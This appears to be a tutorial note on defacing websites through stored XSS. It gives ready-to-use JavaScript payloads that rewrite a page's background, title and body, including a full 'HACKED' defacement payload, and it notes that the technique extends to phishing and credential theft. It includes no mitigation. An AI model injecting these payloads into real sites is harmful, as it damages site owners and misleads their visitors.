# 💀 XSS Exploitation: Website Defacing

---

## 🔹 What is Defacing?

Website defacing is an attack where the attacker **changes the visual appearance of a web page** for users.

👉 Common goals:

* Show "Hacked by..." message
* Damage reputation
* Demonstrate successful exploitation

📌 Defacing is commonly achieved using **Stored XSS** 

---

## 🔹 Why Stored XSS is Used?

* Payload is **stored in the database**
* Executes for **every user visiting the page**
* Persistent effect

---

## 🔹 Core Concept

XSS allows execution of **JavaScript in the victim’s browser**, which can manipulate the **DOM (Document Object Model)**.

👉 This enables:

* Changing content
* Modifying layout
* Replacing entire page

---

## 🔹 Key Elements Used in Defacing

| Element                          | Purpose                        |
| -------------------------------- | ------------------------------ |
| `document.body.style.background` | Change background color        |
| `document.body.background`       | Set background image           |
| `document.title`                 | Change browser tab title       |
| `innerHTML`                      | Modify or replace page content |

---

## 🔹 Defacing Techniques

---

### 1. Change Background Color

```html
<script>
document.body.style.background = "#000";
</script>
```

---

### 2. Set Background Image

```html
<script>
document.body.background = "https://example.com/image.jpg";
</script>
```

---

### 3. Change Page Title

```html
<script>
document.title = "Hacked by Attacker";
</script>
```

---

### 4. Modify Specific Element

```javascript
document.getElementById("id").innerHTML = "Hacked";
```

---

### 5. Replace Entire Page (Full Deface)

```javascript
document.getElementsByTagName('body')[0].innerHTML = "Hacked";
```

---

## 🔹 Full Defacement Payload

```html
<script>
document.body.style.background = "#000";
document.title = "Hacked";
document.getElementsByTagName('body')[0].innerHTML =
'<center><h1 style="color:red">HACKED</h1><p>Owned</p></center>';
</script>
```

---

## 🔹 How It Works

1. Attacker injects payload (via Stored XSS)
2. Payload is saved on server
3. Victim loads page
4. Browser executes JavaScript
5. Page appearance is modified

---

## 🔹 Important Notes

* The **original source code remains unchanged**
* Only the **rendered view in the browser is modified** 
* Changes occur at **runtime via JavaScript**

---

## 🔹 XSS Type vs Defacing

| XSS Type      | Defacing Capability |
| ------------- | ------------------- |
| Stored XSS    | ✅ Persistent        |
| Reflected XSS | ❌ Temporary         |
| DOM XSS       | ⚠️ Limited          |

---

## 🔹 Real-World Impact

* Website appears compromised
* User trust is affected
* Can be extended to:

  * Phishing pages
  * Session hijacking
  * Credential theft

---

## 🔹 Key Takeaways

* Defacing = **UI manipulation via XSS**
* Requires **JavaScript execution in browser**
* Most effective with **Stored XSS**
* `innerHTML` provides full page control

---
